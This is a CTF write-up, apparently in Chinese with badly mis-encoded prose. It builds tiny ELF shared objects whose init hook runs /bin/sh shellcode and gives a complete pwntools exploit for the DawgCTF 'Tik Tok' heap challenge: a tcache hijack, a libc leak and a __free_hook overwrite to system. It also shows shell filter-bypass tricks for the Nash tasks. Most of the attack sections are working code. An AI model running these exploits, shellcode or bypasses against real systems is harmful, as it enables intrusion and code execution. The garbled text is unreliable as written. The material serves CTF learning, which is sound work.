`text`èŠ‚ï¼šç”¨äºå­˜æ”¾æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„`ShellCode`ã€‚</li>
<li>
`DYNSYM`èŠ‚ã€‚</li>
é‚£ä¹ˆæˆ‘ä»¬æ„å»ºçš„ç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼Œ

```
; My_test.s
BITS 64

    org     0x00400000

ehdr:                                               ;   Elf64_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      62                              ;   e_machine
            dd      1                               ;   e_version
            dq      _start                          ;   e_entry
            dq      phdr - $$                       ;   e_phoff
            dq      sectionHeaders - $$             ;   e_shoff
            dd      0                               ;   e_flags
            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
            dw      2                               ;   e_phnum
            dw      64                              ;   e_shentsize
            dw      6                               ;   e_shnum
            dw      4                               ;   e_shstrndx

ehdrsize    equ     $ - ehdr

phdr:                                               ;   Elf64_Phdr
    phdr_loadable:
            dd      1                               ;   p_type
            dd      7                               ;   p_flags
            dq      0                               ;   p_offset
            dq      $$                              ;   p_vaddr
            dq      $$                              ;   p_paddr
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize    equ     $ - phdr

    phdr_dynamic:
            dd      2                               ;   p_type
            dd      7                               ;   p_flags
            dq      dynamic                         ;   p_offset
            dq      dynamic                         ;   p_vaddr
            dq      dynamic                         ;   p_paddr
            dq      dynamicsize                     ;   p_filesz
            dq      dynamicsize                     ;   p_memsz
            dq      0x1000                          ;   p_align

main:
    _start:
            xor rsi,rsi
            cdq
            push rsi

            mov rdi , 0x68732f6e69622f
            push rdi
            push rsp
            pop rdi

            push rsi
            push rdi
            push rsp
            pop rsi 

            push 0x3b
            pop rax
            syscall

mainsize    equ     $ - main

sectionHeaders:
    section_dynsym:
            dd      1               ;sh_name
            dd      11              ;sh_type DYNSYM
            dq      7               ;sh_flags rx
            dq      dynsym          ;sh_addr
            dq      dynsym          ;sh_offset
            dq      dynsymsize      ;sh_size
            dd      3               ;sh_link
            dd      1               ;sh_info
            dq      1               ;sh_addralign
            dq      24              ;sh_entsize

    section_text:
            dd      19              ;sh_name
            dd      1               ;sh_type PROGBITS
            dq      7               ;sh_flags rx
            dq      main            ;sh_addr
            dq      main            ;sh_offset
            dq      mainsize        ;sh_size
            dd      3               ;sh_link
            dd      0               ;sh_info
            dq      1               ;sh_addralign
            dq      0               ;sh_entsize

    section_shstrtab:
            dd      9               ;sh_name
            dd      3               ;sh_type STRTAB
            dq      7               ;sh_flags rx
            dq      shstrtab        ;sh_addr
            dq      shstrtab        ;sh_offset
            dq      shstrtabsize    ;sh_size
            dd      0               ;sh_link
            dd      0               ;sh_info
            dq      1               ;sh_addralign
            dq      0               ;sh_entsize

    section_dynamic:
            dd      41               ;sh_name
            dd      6                ;sh_type SYMTAB
            dq      7                ;sh_flags rx
            dq      dynamic          ;sh_addr
            dq      dynamic          ;sh_offset
            dq      dynamicsize      ;sh_size
            dd      3                ;sh_link
            dd      0                ;sh_info
            dq      8h               ;sh_addralign
            dq      16               ;sh_entsize

sectionHeaderssize    equ     $ - sectionHeaders

dynsym:
    times 24 db 0
            dd      1                 ;st_name
            db      18                ;st_info global function 00010000 || 00000010
            db      0                 ;st_other
            dw      1                 ;st_shndx
            dq        _start            ;st_value
            dq      mainsize          ;st_size

dynsymsize    equ     $ - dynsym

dynamic:
    dt_strtab:
            dq          5
            dq          shstrtab
    dt_symtab:
            dq          6
            dq          dynsym
    dt_none:
            dq          0
            dq          0

dynamicsize    equ     $ - dynamic 


shstrtab:
            db          0

shstrtabsize    equ     $ - shstrtab

filesize    equ     $ - $$
```

ä½†æ˜¯æˆ‘ä»¬å‘ç°ï¼Œè¿™ä¸ªæ–‡ä»¶çš„å¤§å°æ˜¯`556`å­—èŠ‚å¹¶ä¸”å¹¶ä¸ä¼šä¸ºæˆ‘ä»¬å›å¼¹ä¸€ä¸ª`shell`ã€‚

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/dm/1024_60_/t0119a6561030785e7c.png)

è¿›ä¸€æ­¥æŸ¥é˜…èµ„æ–™å‘ç°äº†å¦‚ä¸‹å®šä¹‰

```
DT_INIT 12 d_ptr Address of the initialization function

```

ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠ`DT_INIT`æŒ‡å‘æˆ‘ä»¬çš„`shellcode`å³å¯æ‰§è¡Œæˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°ï¼Œå¹¶ä¸”æˆ‘ä»¬ä¹Ÿä¸éœ€è¦å¦‚æ­¤å¤šçš„èŠ‚åŒºï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ å»ä¸‰ä¸ªæ— å…³èŠ‚åŒºï¼Œä»…ä¿ç•™`dynsym`èŠ‚åŒºå³å¯

```
; My_test.s
BITS 64

    org     0x00400000

ehdr:                                               ;   Elf64_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      62                              ;   e_machine
            dd      1                               ;   e_version
            dq      _start                          ;   e_entry
            dq      phdr - $$                       ;   e_phoff
            dq      sectionHeaders - $$             ;   e_shoff
            dd      0                               ;   e_flags
            dw      ehdrsize                        ;   e_ehsize
            dw      phdrsize                        ;   e_phentsize
            dw      2                               ;   e_phnum
            dw      64                              ;   e_shentsize
            dw      6                               ;   e_shnum
            dw      4                               ;   e_shstrndx

ehdrsize    equ     $ - ehdr

phdr:                                               ;   Elf64_Phdr
    phdr_loadable:
            dd      1                               ;   p_type
            dd      7                               ;   p_flags
            dq      0                               ;   p_offset
            dq      $$                              ;   p_vaddr
            dq      $$                              ;   p_paddr
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize    equ     $ - phdr

    phdr_dynamic:
            dd      2                               ;   p_type
            dd      7                               ;   p_flags
            dq      dynamic                         ;   p_offset
            dq      dynamic                         ;   p_vaddr
            dq      dynamic                         ;   p_paddr
            dq      dynamicsize                     ;   p_filesz
            dq      dynamicsize                     ;   p_memsz
            dq      0x1000                          ;   p_align

main:
    _start:
            xor rsi,rsi
            cdq
            push rsi

            mov rdi , 0x68732f6e69622f
            push rdi
            push rsp
            pop rdi

            push rsi
            push rdi
            push rsp
            pop rsi 

            push 0x3b
            pop rax
            syscall
            ret

mainsize    equ     $ - main

sectionHeaders:
    dynsym:

dynsymsize    equ     $ - dynsym

dynamic:
    dt_strtab:
            dq          5
            dq          dynsym
    dt_symtab:
            dq          6
            dq          dynsym
    dt_init:
            dq          12
            dq          main

dynamicsize    equ     $ - dynamic 

filesize    equ     $ - $$
```

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_104_/t0149ce874a35427360.png)

è¿™æ ·ï¼Œæˆ‘ä»¬å°†ç¨‹åºçš„å¤§å°è¿›ä¸€æ­¥ç¼©å‡åˆ°äº†252å­—èŠ‚ï¼Œä¸”æˆåŠŸå›å¼¹äº†shell

æ¥ä¸‹æ¥æˆ‘ä»¬å‘ç°ï¼Œäº‹å®ä¸Šæœ‰ä¸€äº›ä½ç½®æ˜¯å¯ä»¥é‡å çš„ï¼Œæˆ‘ä»¬æ¥åˆ†æä¸€ä¸ªæä¸ºç²¾ç‚¼çš„exp

```
; My_test.s
BITS 64

    org     0

ehdr:                                               ;   Elf64_Ehdr
            db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    times 8 db      0
            dw      3                               ;   e_type
            dw      62                              ;   e_machine
            dd      1                               ;   e_version
            db      '/bin/sh', 0                    ;   e_entry
            dq      phdr - $$                       ;   e_phoff
    shellcode_begin:
            call    part_a                          ;   e_shoff
    part_a:
            pop     rdi
            sub     rdi, 0x15                        
            xchg    esi, eax
            push    rax
            jmp     part_b                          ;   e_phsize
            dw      phdrsize                        ;   e_phentsize
            dw      2                               ;   e_phnum
    part_b:
            push    rdi
            push    rdi
            push    rsp                      
            mov     al, 59                    
            jmp     part_c                         

ehdrsize    equ     $ - ehdr

phdr:                                               ;   Elf64_Phdr
    phdr_loadable:
            dd      1                               ;   p_type
            dd      7                               ;   p_flags
            dq      0                               ;   p_offset
            dq      $$                              ;   p_vaddr
    part_c:
            pop     rsi
            xor     edx, edx
            syscall
            nop
            nop
            nop
            dq      filesize                        ;   p_filesz
            dq      filesize                        ;   p_memsz
            dq      0x1000                          ;   p_align

phdrsize    equ     $ - phdr

    phdr_dynamic:
            dd      2                               ;   p_type
            dd      7                               ;   p_flags
            dq      dynamic                         ;   p_offset
            dq      dynamic                         ;   p_vaddr
    dynamic:
        dt_init:
            dq          13
            dq          shellcode_begin
        dt_strtab:
            dq          5
            dq          0
        dt_symtab:
            dq          6

filesize    equ     $ - $$
```

é¦–å…ˆï¼Œåœ¨`program_head_table`ä¸­ï¼Œäº‹å®ä¸Šæœ‰ä¸€äº›é¡¹æ˜¯å¯ä»¥ä¸è¢«ä½¿ç”¨çš„ï¼ŒçœŸæ­£ä¸å¯ç¼ºå¤±çš„åªæœ‰`type`ã€`flags`ã€`offset`ã€`virtual_address`ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥æŠŠ`offset`ã€`virtual_address`è¦†ç›–æˆ`virtual_address`ä¹‹åçš„åœ°å€æ¥å®ç°ä¸€ä¸ª`dynamic`å’Œ`phdr_dynamic`çš„é‡å ï¼Œç„¶åï¼Œå½“å…±äº«åº“è°ƒç”¨`fini`å‡½æ•°æ—¶ï¼Œé¦–å…ˆä¼šè°ƒç”¨`shellcode_begin`ï¼Œ`shellcode_begin`å’Œ`Elf64_Ehdr -&gt; e_shoff`è¿›è¡Œäº†ç©ºé—´å¤ç”¨ï¼Œ**åœ¨é‚£ä¹‹åï¼Œç¨‹åºä¼šå°†`pop rdi`æŒ‡ä»¤çš„åœ°å€å‹æ ˆï¼Œå› ä¸ºè¿™ä¸ªåœ°å€æ˜¯`call part_a`çš„è¿”å›åœ°å€**ï¼Œè€Œæˆ‘ä»¬æ¥ä¸‹æ¥ï¼Œå°†è¿™ä¸ªè¿”å›åœ°å€èµ‹ç»™`rdi`ï¼Œç„¶åè®©å…¶å‡å»`0x15`ï¼Œè¿™å°†ä¼šæ°å¥½ä½¿å…¶æŒ‡å‘`/bin/sh`çš„åœ°å€å¤„æ¥ä¸‹æ¥çš„ä¸€ç³»åˆ—shellcodeä¹Ÿå’Œ`Elf64_Ehdr`è¿›è¡Œäº†ç©ºé—´å¤ç”¨ï¼Œæ„é€ çš„ååˆ†ç²¾å·§ï¼Œå»æ‰æœ«å°¾0åæœ€ç»ˆå¤§å°ä»…177å­—èŠ‚ã€‚

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/dm/1024_48_/t01288c6cf8dee8b742.png)



## 0x04 [2020 DawgCTF] Tik Tok â€“ 500pt

> é¢˜ç›®ç±»å‹ï¼šPwn
<p>checksecç»“æœï¼š<br>
Arch: amd64-64-little<br>
RELRO: Full RELRO<br>
Stack: Canary found<br>
NX: NX enabled<br>
PIE: No PIE (0x400000)</p>

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"></a>é¢˜ç›®åˆ†æ

é¢˜ç›®é™¤äº†ç»™å®šäº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒæ—¶ç»™å®šäº†éœ€è¦ä½¿ç”¨çš„libcä»¥åŠä¸€ä¸ªsongsçš„å‹ç¼©åŒ…ï¼Œè§£å‹åå†…éƒ¨æ˜¯è‹¥å¹²æ–‡æœ¬æ–‡ä»¶ã€‚

æˆ‘ä»¬ä¸ºäº†æ–¹ä¾¿è¯»å–è¿™äº›æ–‡ä»¶ï¼Œæˆ‘ä»¬ç»™ä¸è¿™äº›æ–‡ä»¶æœ€é«˜æƒé™

### <a class="reference-link" name="%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91"></a>ç¨‹åºé€»è¾‘

ç”±äºç¨‹åºä¿ç•™äº†ä¸€å®šçš„ç¬¦å·ï¼Œè¿™æ–¹ä¾¿æˆ‘ä»¬åˆ†æåŠŸèƒ½ï¼Œç¨‹åºæœ‰ä»¥ä¸‹åŠŸèƒ½ï¼š
<li>ç¨‹åºä¸­çš„æ•°æ®ç»“æ„ä¸ºï¼š
<pre><code class="lang-c hljs cpp">struct Songs{
    char path[0x18];
    _DWORD *fd;
    _DWORD *padding;
    _QWORD *dir;
    _QWORD *name;
    _QWORD *play_content;
}
</code></pre>
</li>
<li>
`Import_song`ï¼šé¦–å…ˆæ‰§è¡Œ`ls -R`ï¼Œéå†å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åç”¨æˆ·è¾“å…¥ä¸€ä¸ª`&lt;dir&gt;/&lt;file_name&gt;.&lt;ex_type&gt;`çš„è·¯å¾„ä¿å­˜åœ¨`songs[song_count].path`é‡Œï¼Œå°è¯•æ‰“å¼€é‚£ä¸ªè·¯å¾„æ‰€ä»£è¡¨çš„æ–‡ä»¶ï¼Œå°†æ–‡ä»¶å¥æŸ„æ”¾åœ¨`songs[song_count].fd`é‡Œã€‚æ¥ç€è‹¥ä»¥ä¸‹æ¡ä»¶å‡æ»¡è¶³åˆ™ç»§ç»­è¿è¡Œï¼Œå¦åˆ™ç¨‹åºé€€å‡ºï¼š
<ol>
<li>
`songs[song_count].fd`ä¸ä¸º`-1`ï¼ˆæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼‰</li>
<li>
`songs[song_count].path[0]`ä¸ºå¯è¯»å­—ç¬¦ï¼ˆä¸€å®šç¨‹åº¦é˜²æ­¢è¯»éæ³•æ–‡ä»¶ï¼‰</li>
<li>
`songs[song_count].path`ä¸­ä¸å­˜åœ¨`flag`æˆ–`../`ï¼ˆé˜²æ­¢è¯»`flag`æ–‡ä»¶ä»¥åŠé˜²æ­¢è·¨ç›®å½•è¯»æ–‡ä»¶ï¼‰</li>
å°†`&lt;dir&gt;`ä¿å­˜åœ¨`songs[song_count].dir`é‡Œï¼Œå°†`&lt;file_name&gt;`ä¿å­˜åœ¨`songs[song_count].file_name`é‡Œï¼Œ`song_count`å¢åŠ `1`ã€‚

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>æ¼æ´åˆ†æ
1. é¦–å…ˆï¼Œæˆ‘ä»¬é‡åˆ°çš„æœ€å¤§å›°éš¾å°±æ˜¯å‘`chunk`çš„å†™å…¥çœ‹ä¼¼ä¸å¯æ§ï¼Œå› æ­¤æˆ‘ä»¬è¦æƒ³åŠæ³•è®©æŸä¸ª`song`çš„æ–‡ä»¶æè¿°ç¬¦ä¸º`0`ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡`stdin`å‘å…¶ä¸­å†™å…¥æ•°æ®äº†ã€‚
1. åœ¨`play_song`åŠŸèƒ½ä¸­ï¼Œç¨‹åºæ²¡æœ‰å¯¹`size`è¿›è¡Œä»»ä½•æ£€æŸ¥ä¸”å…¶ä¸ºæ— ç¬¦å·å˜é‡ï¼Œè¿™å°†ä¼šå¯¼è‡´å †æº¢å‡ºï¼Œè‹¥æˆ‘ä»¬èƒ½æ§åˆ¶`size`ä¸º`-1`ï¼Œå°†ä¼šè°ƒç”¨`malloc(0)`ï¼Œä¸”å°†å…è®¸å‘è¿”å›çš„`Chunk`å†™å…¥æå¤§é‡çš„æ•°æ®ï¼
### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>æ¼æ´åˆ©ç”¨

#### <a class="reference-link" name="%E5%88%9B%E5%BB%BA%E5%8F%AF%E6%8E%A7Chunk"></a>åˆ›å»ºå¯æ§Chunk

åˆ©ç”¨`open`å‡½æ•°çš„æ¼æ´ï¼Œå¯¹äº`open`å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªç›®å½•ï¼Œå®ƒä¹Ÿå°†ä¼šæˆåŠŸçš„æ‰“å¼€è€Œä¸ä¼šè¿”å›å¤±è´¥ï¼Œä¸”è¿™ä¸ªç›®å½•å…è®¸æ·»åŠ å¤šä¸ª`/`ã€‚

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/dm/1024_610_/t01d62a64ad1a8129d1.png)

æ­¤å¤„å­˜åœ¨ï¼š
<li>
`path`æˆå‘˜å’Œ`fd`æˆå‘˜ç›´æ¥ç›¸é‚»ï¼Œä¸”åœ¨å‘`path`æˆå‘˜å†™å€¼æ—¶å­˜åœ¨é€»è¾‘ï¼Œå½“ä¸”ä»…å½“`path`æˆå‘˜çš„æœ«å°¾æ˜¯`n`æ—¶ï¼Œæ‰ä¼šå°†å…¶æ›¿æ¢æˆ`x00`å¦åˆ™ä¸ä½œä»»ä½•æ“ä½œï¼</li>
1. ç¨‹åºé™å®š`song_count`çš„ä¸Šé™æ˜¯`0x31`ï¼Œè€Œ`fd`å¤„å­˜æ”¾çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦å°†ä¼šç”±`3`å¼€å§‹é€’å¢ï¼Œå½“å…¶é€’å¢åˆ°`0x2E`æ—¶ï¼Œè‹¥`path`ä¸­æ²¡æœ‰`.`ï¼Œå°†ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ›¿æ¢æˆNULLã€‚
äºæ˜¯æˆ‘ä»¬çš„åˆ©ç”¨è„šæœ¬å¦‚ä¸‹ï¼š

```
for i in range(3,0x2F):
    import_song(sh,'Animal/'.ljust(0x18,'/'))
```

[![](./img/203685/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/dm/1024_496_/t01c3ff1f1674caa89f.png)

**âš ï¼šæ­¤å¤„è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼æ­£å¦‚æˆ‘ä»¬åœ¨ç¨‹åºé€»è¾‘ä¸­è¯´æ˜çš„é‚£æ ·ï¼Œä¸€æ—¦æˆ‘ä»¬å¯¹è¿™ä¸ªæ­Œæ›²æ‰§è¡Œäº†é‡Šæ”¾æ“ä½œï¼Œç¨‹åºå°†å…³é—­fdæŒ‡é’ˆå¤„çš„æ–‡ä»¶æµï¼Œè€Œåœ¨æ­¤å¤„ï¼Œè¿™æ„å‘³ç€`stdin`å°†ä¼šè¢«å…³é—­ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»é˜²æ­¢å…¶è¢«é‡Šæ”¾ï¼**

#### åŠ«æŒ`Tcache Bin`

æˆ‘ä»¬å‘ç°`Animal/blahblah.txt`å°†ä¼šç”³è¯·`0x660`å¤§å°çš„`chunk`ï¼Œè€Œ`Animal/animal.txt`å°†ä¼šç”³è¯·`0x3B0`å¤§å°çš„`chunk`ã€‚é‚£ä¹ˆæˆ‘ä»¬è‹¥å…ˆç”³è¯·ä¸€ä¸ª`0x660`å¤§å°çš„`chunk`ï¼Œå†ç”³è¯·ä¸€ä¸ª`0x3B0`å¤§å°çš„`chunk`ï¼Œç„¶åä¾æ¬¡é‡Šæ”¾ï¼Œç„¶åä½¿ç”¨é‚£ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œæˆ‘ä»¬å°†å¯ä»¥ç›´æ¥åŠ«æŒ`Tcache Bin`ç»“æ„ã€‚

é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆæ„é€ å¦‚ä¸‹`Payload`ï¼š

```
import_song(sh,'Animal/blahblah.txt')  # 45
import_song(sh,'Animal/animal.txt')    # 46

play_song(sh,45)
play_song(sh,46)

remove_song(sh,45)
remove_song(sh,46)
```

#### <a class="reference-link" name="%E5%8A%AB%E6%8C%81songs"></a>åŠ«æŒsongs

æ¥ä¸‹æ¥æˆ‘ä»¬ä¸è¦å¿˜äº†ï¼Œ**åœ¨ç¨‹åº`malloc`ä¹‹åï¼Œä¼šéšå³è°ƒç”¨`memset`å‡½æ•°è¿›è¡Œ`chunk`çš„æ¸…ç©ºï¼Œè¿™æœ¬æ˜¯é˜²æ­¢é—ç•™æ•°æ®è¢«éæ³•è¯»å–çš„ä¿æŠ¤é€»è¾‘ï¼Œä½†åœ¨æ­¤å¤„ï¼Œåè€Œå¯ä»¥æˆä¸ºæˆ‘ä»¬åˆ©ç”¨çš„åé—¨ã€‚**è‹¥æˆ‘ä»¬å°†`Chunk 46`çš„`fd`æŒ‡é’ˆç¯¡æ”¹ä¸º`A`ï¼Œå½“æˆ‘ä»¬ä»`Tcache`ä¸­å–å›`Fake_chunk`æ—¶ï¼Œç¨‹åºå°†ä¼šæ“¦é™¤`A`åˆ°`A + 0x3B3`ä¹‹é—´çš„æ‰€æœ‰æ•°æ®ã€‚é‚£ä¹ˆæˆ‘ä»¬æœŸæœ›å®ƒæ“¦é™¤åæ°å¥½æœ‰ä¸€ä¸ª`song`å‘ˆç°ä»…`fd`å’Œ`path`è¢«æ“¦é™¤çš„çŠ¶æ€ã€‚è¿™å…¶å®å¾ˆå¥½è®¡ç®— $mathbf{0x3B3} = 16 times mathbf{0x38} + 24 + mathbf{0x18} + 3$ è‹¥æˆ‘ä»¬æŒ‡å®š`A`æ˜¯`songs[0].dir`ï¼Œé‚£ä¹ˆï¼Œ`songs[17]`å°±æ˜¯ç¬¦åˆæ¡ä»¶çš„`song`ã€‚

æ„é€ å¦‚ä¸‹`Payload`ï¼š

```
play_song(sh,44,-1,'x41' * 0x660 + p64(0) + p64(0x3C0) + p64(0x404080))
       play_song(sh,44,-1,'x41' * 0x660 + p64(0) + p64(0x3C0) + p64(0x404080))
play_song(sh,43)

fake_songs  = ......

play_song(sh,18,fake_songs)
```

`fake_songs`çš„å†…å®¹å°†ä¼šè¢«æ•´ä½“å†™å…¥`songs`åˆ—è¡¨ä¸­ã€‚

åŠ«æŒäº†`songs`åç»­åˆ©ç”¨å°±æ¯”è¾ƒå¸¸è§„äº†ï¼Œåªéœ€è¦æ³¨æ„ä¸¤ä¸ªåŸåˆ™ï¼š
1. ğŸš«ç¦æ­¢`free`æ‰ä¸€ä¸ª`fd`ä¸º`0`çš„`Chunk`ï¼Œè¿™ä¼šå¯¼è‡´`stdin`è¢«å…³é—­ã€‚
<li>
`Tcache bin`çš„`0x3C0`é“¾è¡¨å·²è¢«æŸåï¼Œä¸è¦ä½¿ç”¨è¿™ä¸ªé“¾è¡¨ã€‚</li>
### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

tiktok=ELF('./tiktok', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./tiktok")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./tiktok")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def import_song(sh,path):
    sh.recvuntil('Choice: ')
    sh.sendline('1')
    sh.recvuntil('Please provide the entire file path.')
    sh.send(path)

def list_playlist(sh):
    sh.recvuntil('Choice: ')
    sh.sendline('2')

def play_song(sh,index,size=None,content=None):
    sh.recvuntil('Choice: ')
    sh.sendline('3')
    sh.recvuntil('Choice: ')
    sh.sendline(str(index))
    if size:
        sleep(0.5)
        sh.sendline(str(size))
    if content:
        sleep(0.5)
        sh.send(content)

def remove_song(sh,index):
    sh.recvuntil('Choice: ')
    sh.sendline('4')
    sh.recvuntil('Choice: ')
    sh.sendline(str(index))

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        for i in range(3,0x2E):
            import_song(sh,'Animal/animal.txt')
        import_song(sh,'Animal/'.ljust(0x18,'/'))


        import_song(sh,'Animal/blahblah.txt')  # 45
        import_song(sh,'Animal/animal.txt')    # 46

        play_song(sh,45)
        play_song(sh,46)

        remove_song(sh,45)
        remove_song(sh,46)


        play_song(sh,44,-1,'x41' * 0x660 + p64(0) + p64(0x3C0) + p64(0x404080))
        play_song(sh,43)

        fake_songs  = 'x00' * 8 + p64(0x404457) + p64(0)

        fake_songs += 'A' * 0x18                # fake_path
        fake_songs += p64(4)                    # fake_fd
        fake_songs += p64(tiktok.got['puts'])   # fake_dir
        fake_songs += p64(tiktok.got['puts'])   # fake_name
        fake_songs += p64(0)                    # fake_content

        fake_songs += p64(0) + p64(0)           # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(5)                    # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0x404150)             # fake_content

        fake_songs += p64(0) + p64(0)           # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(6)                    # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0x404150)             # fake_content

        fake_songs += p64(0) + p64(0x21)        # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(0)                    # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0)                    # fake_content

        fake_songs += p64(0) + p64(0x21)        # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(0)                    # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0)                    # fake_content

        fake_songs += p64(0) + p64(0x21)        # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(0)                    # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0)                    # fake_content

        fake_songs += p64(0) + p64(0x21)        # fake_path
        fake_songs += p64(0)                    # fake_path_2
        fake_songs += p64(10)                   # fake_fd
        fake_songs += p64(0x404080)             # fake_dir
        fake_songs += p64(0x404080)             # fake_name
        fake_songs += p64(0x401050)             # fake_content

        play_song(sh,18,fake_songs)
        list_playlist(sh)

        puts_addr = 0
        sh.recvuntil('2. ')
        data = sh.recvuntil('-',drop=True)
        for i in data[::-1]:
            puts_addr  = puts_addr &lt;&lt; 8
            puts_addr += ord(i)
        libc.address = puts_addr - libc.symbols['puts']
        success('The libc base address is ' + str(hex(libc.address)))


        remove_song(sh,3)
        remove_song(sh,4)
        play_song(sh,5,0x8,p64(libc.symbols['__free_hook']))
        play_song(sh,6,0x8,'/bin/sh')
        play_song(sh,7,0x8,p64(libc.symbols['system']))
        remove_song(sh,6)
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag{.+}',flag).group())
```



## 0x05 [2020 DawgCTF 2020] Nash/Nash2

> é¢˜ç›®ç±»å‹ï¼šPwn

é¢˜ç›®çš„é€»è¾‘ååˆ†ç®€å•ï¼Œåœ¨`Nash`ä¸­ï¼Œç¨‹åºé™åˆ¶äº†æˆ‘ä»¬åœ¨`shell`ä¸­ä½¿ç”¨ç©ºæ ¼ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`&lt;`å°†æˆ‘ä»¬çš„`flag`æ–‡ä»¶é‡å®šå‘åˆ°å‘½ä»¤ä¸­ï¼Œå³`cat&lt;flag.txt`ã€‚åœ¨`Nash2`ä¸­ï¼Œç¨‹åºé™åˆ¶äº†æˆ‘ä»¬åœ¨`shell`ä¸­ä½¿ç”¨ç©ºæ ¼ä»¥åŠ`&lt;`ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨`ps|more`å°±å¯ä»¥è¿›å…¥`more`çš„äº¤äº’ç¯å¢ƒä¸­ï¼Œåœ¨é‚£ä¹‹åæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨`!'sh' flag.txt`è¯»å–`flag`æ–‡ä»¶ã€‚



## 0x06 å‚è€ƒé“¾æ¥

